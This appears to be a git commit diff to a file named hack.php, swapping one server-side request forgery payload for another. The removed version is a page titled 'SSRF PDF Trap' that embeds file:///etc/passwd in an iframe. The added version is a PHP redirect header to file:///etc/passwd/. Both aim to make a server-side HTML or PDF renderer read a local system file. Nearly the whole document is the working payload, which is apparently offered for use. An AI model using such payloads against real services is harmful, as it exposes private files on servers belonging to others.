766aa343fe36f0ca38fcf605d7016837385bf328
Ilya23062004 <71217869+Ilya23062004@users.noreply.github.com>
2025-07-30 21:41:38 +0300

    Update hack.php

--- hack.php
+++ hack.php
@@ -1,16 +1,6 @@
-<?php
-header("Content-Type: text/html");
-
-echo <<<HTML
 <!DOCTYPE html>
 <html>
-<head>
-    <title>SSRF PDF Trap</title>
-</head>
 <body>
-    <h1>Try reading local file</h1>
-    <iframe src="file:///etc/passwd" width="100%" height="800"></iframe>
+<?php header('location:file:///etc/passwd/'); ?>
 </body>
 </html>
-HTML;
-?>
